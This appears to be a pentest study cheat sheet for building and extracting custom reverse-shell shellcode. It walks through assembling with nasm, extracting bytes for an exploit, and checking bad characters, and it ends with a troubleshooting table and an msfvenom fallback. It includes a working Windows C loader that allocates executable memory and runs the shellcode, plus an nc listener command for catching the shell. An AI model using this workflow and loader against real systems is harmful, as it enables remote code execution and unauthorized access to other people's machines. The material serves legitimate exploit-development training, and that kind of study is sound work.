# Building & Extracting Custom Shellcode

## 1. Assemble
```bash
nasm -f bin reverse_shell.asm -o reverse_shell.bin
```

## 2. Inspect / verify opcodes
```bash
# Disassemble to confirm it matches your intent:
objdump -D -b binary -m i386 reverse_shell.bin

# Size check (mind your space budget):
wc -c reverse_shell.bin
```

## 3. Extract bytes into your exploit
```bash
# Python bytes literal:
python3 -c "print(''.join('\\\\x%02x'%b for b in open('reverse_shell.bin','rb').read()))"

# C array:
xxd -i reverse_shell.bin

# Flat hex:
xxd -p reverse_shell.bin | tr -d '\n'; echo
```

## 4. Badchar check BEFORE trusting it
```bash
python3 - <<'PY'
sc  = open('reverse_shell.bin','rb').read()
bad = b"\x00\x0a\x0d"          # your target's badchar set
hits = [(i, hex(c)) for i,c in enumerate(sc) if c in bad]
print("badchar hits:", hits or "NONE — clean")
PY
```
Any hit = rework that instruction (see `01-cheatsheets/nasm-shellcode.md` null-avoidance
table) or encode the offending value at runtime (xor-decode the IP/port, etc.).

## 5. Test in isolation (loader stub)
Compile a tiny C loader that VirtualAllocs RWX, copies the bytes, and calls them —
run it under WinDbg and single-step (`t`) to watch the API resolution and each stage.
```c
// loader.c  (cl loader.c)
#include <windows.h>
unsigned char sc[] = { /* xxd -i output */ };
int main(){
    void *m = VirtualAlloc(0, sizeof(sc), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(m, sc, sizeof(sc));
    ((void(*)())m)();
    return 0;
}
```
Set a listener first (`nc -lvnp 443`), then run the loader.

## 6. Common failure -> fix
| Symptom | Likely cause | Fix |
|---|---|---|
| crashes immediately | bad PEB walk offset / clobbered reg | single-step, watch the walk |
| resolves wrong API | hash collision / wrong hash const | recompute ror13 hash |
| connects but no shell | STARTUPINFO handles not set to socket | set hStdInput/Output/Error=socket, dwFlags=0x100 |
| null byte in payload | literal 0 in an instruction | xor/al tricks, encode constants |
| dies only in exploit, works in loader | a badchar truncated it in transit | widen `-b`, re-verify with mona compare |

## msfvenom fallback (when time-boxed)
If hand-rolling is eating your clock, generate with msfvenom
(`01-cheatsheets/msfvenom.md`) and move on. Custom shellcode is a skill to *have*, but
on the clock a working exploit beats an elegant one.
